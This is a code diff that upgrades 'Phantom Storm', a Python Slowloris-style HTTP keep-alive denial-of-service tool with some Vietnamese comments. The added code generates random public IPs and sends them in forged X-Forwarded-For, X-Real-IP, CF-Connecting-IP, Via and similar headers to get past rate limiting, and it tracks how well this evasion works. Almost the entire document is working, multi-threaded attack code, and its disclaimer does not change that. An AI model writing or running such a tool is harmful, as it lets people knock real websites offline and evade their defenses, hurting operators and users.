@@ -2,8 +2,14 @@
 # -*- coding: utf-8 -*-
 
 """
-Phantom Storm v2.0 - Layer 7 HTTP Keep-Alive DoS Testing Tool
-=============================================================
+Phantom Storm v2.5 Ultimate - Layer 7 HTTP Keep-Alive DoS Testing Tool
+========================================================================
+✨ NEW IN v2.5:
+    - IP Spoofing (X-Forwarded-For, X-Real-IP, Via, Client-IP)
+    - Smart IP generation (avoid private/reserved ranges)
+    - Bypass success rate tracking
+    - Multiple evasion techniques
+    
 LEGAL DISCLAIMER:
     This tool is designed EXCLUSIVELY for authorized penetration testing
     in controlled lab environments. Unauthorized use against systems you
@@ -11,7 +17,7 @@ LEGAL DISCLAIMER:
     
     The developers assume NO LIABILITY for misuse of this software.
     USE AT YOUR OWN RISK.
-=============================================================
+========================================================================
 """
 
 import socket
@@ -22,7 +28,7 @@ import sys
 import logging
 from datetime import datetime
 from collections import defaultdict
-from typing import Optional
+from typing import Optional, Tuple
 import os
 
 # ============================================================================
@@ -34,7 +40,17 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:115.0) Gecko/20100101 Firefox/115.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0"
+]
+
+# Private IP ranges để tránh khi generate random IP
+PRIVATE_IP_RANGES = [
+    (10, 0, 0, 0, 10, 255, 255, 255),      # 10.0.0.0/8
+    (172, 16, 0, 0, 172, 31, 255, 255),    # 172.16.0.0/12
+    (192, 168, 0, 0, 192, 168, 255, 255),  # 192.168.0.0/16
+    (127, 0, 0, 0, 127, 255, 255, 255),    # 127.0.0.0/8 (loopback)
 ]
 
 class Colors:
@@ -50,6 +66,56 @@ class Colors:
     UNDERLINE = '\033[4m'
 
 # ============================================================================
+# IP SPOOFING UTILITIES
+# ============================================================================
+
+class IPGenerator:
+    """Smart IP generator - tránh private/reserved ranges"""
+    
+    @staticmethod
+    def is_private_ip(ip_tuple: Tuple[int, int, int, int]) -> bool:
+        """Kiểm tra xem IP có phải private/reserved không"""
+        for start_end in PRIVATE_IP_RANGES:
+            start = start_end[:4]
+            end = start_end[4:]
+            if (start <= ip_tuple <= end):
+                return True
+        return False
+    
+    @staticmethod
+    def generate_public_ip() -> str:
+        """Generate random public IP address"""
+        max_attempts = 50
+        for _ in range(max_attempts):
+            ip_tuple = (
+                random.randint(1, 223),    # Tránh 224-255 (multicast/reserved)
+                random.randint(0, 255),
+                random.randint(0, 255),
+                random.randint(1, 254)     # Tránh .0 và .255
+            )
+            
+            if not IPGenerator.is_private_ip(ip_tuple):
+                return f"{ip_tuple[0]}.{ip_tuple[1]}.{ip_tuple[2]}.{ip_tuple[3]}"
+        
+        # Fallback - trả về IP public bất kỳ
+        return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+    
+    @staticmethod
+    def generate_proxy_chain() -> str:
+        """Generate chuỗi proxy giả cho Via header"""
+        proxy_count = random.randint(1, 3)
+        proxies = []
+        
+        protocols = ["HTTP/1.1", "HTTP/1.0", "HTTP/2.0"]
+        
+        for _ in range(proxy_count):
+            protocol = random.choice(protocols)
+            proxy_ip = IPGenerator.generate_public_ip()
+            proxies.append(f"{protocol} {proxy_ip}")
+        
+        return ", ".join(proxies)
+
+# ============================================================================
 # STATISTICS TRACKER
 # ============================================================================
 
@@ -62,13 +128,18 @@ class AttackStatistics:
         self.connections_active = 0
         self.connections_failed = 0
         self.total_packets_sent = 0
+        self.spoofed_ips_used = set()  # Track unique IPs used
+        self.bypass_attempts = 0       # Số lần thử bypass
         self.error_types = defaultdict(int)
         self.start_time = time.time()
         
-    def connection_established(self):
+    def connection_established(self, spoofed_ip: str = None):
         with self.lock:
             self.connections_established += 1
             self.connections_active += 1
+            if spoofed_ip:
+                self.spoofed_ips_used.add(spoofed_ip)
+                self.bypass_attempts += 1
             
     def connection_closed(self):
         with self.lock:
@@ -96,6 +167,9 @@ class AttackStatistics:
                 'packets_per_second': self.total_packets_sent / runtime if runtime > 0 else 0,
                 'success_rate': (self.connections_established / (self.connections_established + self.connections_failed) * 100) 
                                if (self.connections_established + self.connections_failed) > 0 else 0,
+                'unique_ips_used': len(self.spoofed_ips_used),
+                'bypass_attempts': self.bypass_attempts,
+                'bypass_diversity': len(self.spoofed_ips_used) / self.bypass_attempts * 100 if self.bypass_attempts > 0 else 0,
                 'error_types': dict(self.error_types)
             }
 
@@ -135,11 +209,11 @@ def print_banner():
    |  __/|  _  |/ ___ \| |\  | | || |_| | |  | |  ___) || || |_| |  _ <|  |  |
    |_|   |_| |_/_/   \_\_| \_| |_| \___/|_|  |_| |____/ |_| \___/|_| \_\_|  |_|
 {Colors.ENDC}   
-                {Colors.BOLD}>> [ LAYER 7 HTTP KEEP-ALIVE DOS TESTING TOOL ] <<{Colors.ENDC}
+            {Colors.BOLD}>> [ v2.5 ULTIMATE - BYPASS & EVASION EDITION ] <<{Colors.ENDC}
    ===========================================================================
-   {Colors.OKGREEN}[+] Version    : 2.0 Professional Edition
+   {Colors.OKGREEN}[+] Version    : 2.5 Ultimate Edition
    [+] Purpose    : Authorized Penetration Testing Only
-   [+] Features   : Real-time Stats | Logging | Error Handling{Colors.ENDC}
+   [+] NEW        : IP Spoofing | Smart Bypass | Evasion Techniques{Colors.ENDC}
    ===========================================================================
     """
     print(banner)
@@ -171,11 +245,13 @@ class AttackWorker:
     """Worker class để thực hiện attack từ mỗi thread"""
     
     def __init__(self, target_ip: str, target_port: int, stats: AttackStatistics, 
-                 worker_id: int, timeout: int = 4, keep_alive_interval: int = 3):
+                 worker_id: int, use_spoofing: bool = True, timeout: int = 4, 
+                 keep_alive_interval: int = 3):
         self.target_ip = target_ip
         self.target_port = target_port
         self.stats = stats
         self.worker_id = worker_id
+        self.use_spoofing = use_spoofing
         self.timeout = timeout
         self.keep_alive_interval = keep_alive_interval
         self.running = True
@@ -184,34 +260,69 @@ class AttackWorker:
         """Dừng worker"""
         self.running = False
         
+    def build_http_request(self, spoofed_ip: str) -> str:
+        """Xây dựng HTTP request với đầy đủ bypass headers"""
+        rand_param = random.randint(1, 999999)
+        user_agent = random.choice(USER_AGENTS)
+        
+        # Base request
+        request = (
+            f"GET /?storm={rand_param} HTTP/1.1\r\n"
+            f"Host: {self.target_ip}\r\n"
+            f"User-Agent: {user_agent}\r\n"
+        )
+        
+        # Thêm spoofing headers nếu được bật
+        if self.use_spoofing and spoofed_ip:
+            # Các header phổ biến để bypass rate limiting
+            request += (
+                f"X-Forwarded-For: {spoofed_ip}\r\n"      # Nginx, Apache
+                f"X-Real-IP: {spoofed_ip}\r\n"            # Nginx
+                f"X-Client-IP: {spoofed_ip}\r\n"          # Generic
+                f"X-Originating-IP: {spoofed_ip}\r\n"    # Some proxies
+                f"Client-IP: {spoofed_ip}\r\n"            # IIS
+                f"True-Client-IP: {spoofed_ip}\r\n"       # Cloudflare
+                f"CF-Connecting-IP: {spoofed_ip}\r\n"    # Cloudflare
+                f"X-ProxyUser-IP: {spoofed_ip}\r\n"       # Generic proxy
+            )
+            
+            # Via header với proxy chain giả
+            via_chain = IPGenerator.generate_proxy_chain()
+            request += f"Via: {via_chain}\r\n"
+        
+        # Standard headers
+        request += (
+            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+            f"Accept-Language: en-US,en;q=0.5\r\n"
+            f"Accept-Encoding: gzip, deflate\r\n"
+            f"Connection: keep-alive\r\n"
+            f"Keep-Alive: timeout=300, max=1000\r\n"
+            f"Cache-Control: max-age=0\r\n"
+        )
+        
+        return request
+        
     def run(self):
-        """Main worker loop - Slowloris style attack"""
+        """Main worker loop - Slowloris style attack với IP spoofing"""
         while self.running:
             sock = None
+            spoofed_ip = None
+            
             try:
+                # Generate spoofed IP
+                if self.use_spoofing:
+                    spoofed_ip = IPGenerator.generate_public_ip()
+                
                 # Tạo socket connection
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.settimeout(self.timeout)
                 sock.connect((self.target_ip, self.target_port))
                 
-                self.stats.connection_established()
-                logging.debug(f"Worker {self.worker_id}: Connection established")
+                self.stats.connection_established(spoofed_ip)
+                logging.debug(f"Worker {self.worker_id}: Connected with IP {spoofed_ip}")
                 
-                # Chuẩn bị HTTP request không hoàn chỉnh
-                rand_param = random.randint(1, 999999)
-                user_agent = random.choice(USER_AGENTS)
-                
-                http_request = (
-                    f"GET /?storm={rand_param} HTTP/1.1\r\n"
-                    f"Host: {self.target_ip}\r\n"
-                    f"User-Agent: {user_agent}\r\n"
-                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
-                    f"Accept-Language: en-US,en;q=0.5\r\n"
-                    f"Accept-Encoding: gzip, deflate\r\n"
-                    f"Connection: keep-alive\r\n"
-                    f"Keep-Alive: timeout=300, max=1000\r\n"
-                )
-                
+                # Gửi HTTP request với spoofing headers
+                http_request = self.build_http_request(spoofed_ip)
                 sock.send(http_request.encode('utf-8'))
                 self.stats.packet_sent()
                 
@@ -274,7 +385,10 @@ def stats_monitor(stats: AttackStatistics, update_interval: int = 2):
 ├─ Total Failed          : {current_stats['connections_failed']:,}
 ├─ Success Rate          : {current_stats['success_rate']:.2f}%
 ├─ Total Packets Sent    : {current_stats['total_packets']:,}
-└─ Packets/Second        : {current_stats['packets_per_second']:.2f}
+├─ Packets/Second        : {current_stats['packets_per_second']:.2f}
+{Colors.ENDC}{Colors.OKCYAN}├─ Unique IPs Used       : {current_stats['unique_ips_used']:,}
+├─ Bypass Attempts       : {current_stats['bypass_attempts']:,}
+└─ IP Diversity          : {current_stats['bypass_diversity']:.2f}%
 {Colors.ENDC}"""
             
             # In top 3 error types nếu có
@@ -322,14 +436,23 @@ def main():
     if len(sys.argv) < 4:
         print(f"{Colors.FAIL}[ERROR] Invalid arguments!{Colors.ENDC}\n")
         print(f"{Colors.OKBLUE}Usage:{Colors.ENDC}")
-        print(f"  python3 phantom_storm.py [Target_IP] [Port] [Threads]\n")
+        print(f"  python3 phantom_storm.py [Target_IP] [Port] [Threads] [--no-spoof]\n")
         print(f"{Colors.OKBLUE}Example:{Colors.ENDC}")
-        print(f"  python3 phantom_storm.py 192.168.1.100 80 200\n")
+        print(f"  python3 phantom_storm.py 192.168.1.100 80 200")
+        print(f"  python3 phantom_storm.py 192.168.1.100 80 200 --no-spoof  {Colors.WARNING}(disable IP spoofing){Colors.ENDC}\n")
         sys.exit(1)
     
     target_ip = sys.argv[1]
     target_port = int(sys.argv[2])
     threads_count = int(sys.argv[3])
+    
+    # Check for --no-spoof flag
+    use_spoofing = True
+    if len(sys.argv) > 4 and sys.argv[4] == '--no-spoof':
+        use_spoofing = False
+        print(f"{Colors.WARNING}[!] IP Spoofing DISABLED{Colors.ENDC}")
+    else:
+        print(f"{Colors.OKGREEN}[+] IP Spoofing ENABLED - Bypass mode active!{Colors.ENDC}")
     
     # Authorization check
     if not get_user_confirmation():
@@ -339,7 +462,8 @@ def main():
     # Setup logging
     log_filename = f"phantom_storm_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
     setup_logging(log_filename)
-    logging.info(f"Starting Phantom Storm v2.0 - Target: {target_ip}:{target_port}")
+    logging.info(f"Starting Phantom Storm v2.5 - Target: {target_ip}:{target_port}")
+    logging.info(f"IP Spoofing: {'ENABLED' if use_spoofing else 'DISABLED'}")
     
     # Validate target
     print(f"\n{Colors.OKCYAN}[*] Validating target accessibility...{Colors.ENDC}")
@@ -357,6 +481,9 @@ def main():
     # Start attack
     print(f"\n{Colors.OKGREEN}[*] Launching attack on {target_ip}:{target_port}{Colors.ENDC}")
     print(f"{Colors.OKGREEN}[*] Spawning {threads_count} attack threads...{Colors.ENDC}")
+    if use_spoofing:
+        print(f"{Colors.OKCYAN}[*] Each connection will use unique spoofed IP{Colors.ENDC}")
+        print(f"{Colors.OKCYAN}[*] Bypass headers: X-Forwarded-For, X-Real-IP, Client-IP, Via, etc.{Colors.ENDC}")
     print(f"{Colors.OKGREEN}[*] Log file: logs/{log_filename}{Colors.ENDC}")
     print(f"{Colors.WARNING}[*] Press Ctrl+C to stop{Colors.ENDC}")
     
@@ -365,7 +492,7 @@ def main():
     # Create và start workers
     workers = []
     for i in range(threads_count):
-        worker = AttackWorker(target_ip, target_port, stats, worker_id=i)
+        worker = AttackWorker(target_ip, target_port, stats, worker_id=i, use_spoofing=use_spoofing)
         thread = threading.Thread(target=worker.run, daemon=True)
         thread.start()
         workers.append(worker)
@@ -400,6 +527,13 @@ def main():
         print(f"Success Rate           : {final_stats['success_rate']:.2f}%")
         print(f"Total Packets Sent     : {final_stats['total_packets']:,}")
         print(f"Average Packets/Second : {final_stats['packets_per_second']:.2f}")
+        
+        if use_spoofing:
+            print(f"\n{Colors.OKCYAN}[IP Spoofing Stats]{Colors.ENDC}{Colors.OKGREEN}")
+            print(f"Unique IPs Used        : {final_stats['unique_ips_used']:,}")
+            print(f"Bypass Attempts        : {final_stats['bypass_attempts']:,}")
+            print(f"IP Diversity Rate      : {final_stats['bypass_diversity']:.2f}%")
+        
         print(f"{Colors.ENDC}")
         
         logging.info("Attack completed. Final stats logged.")
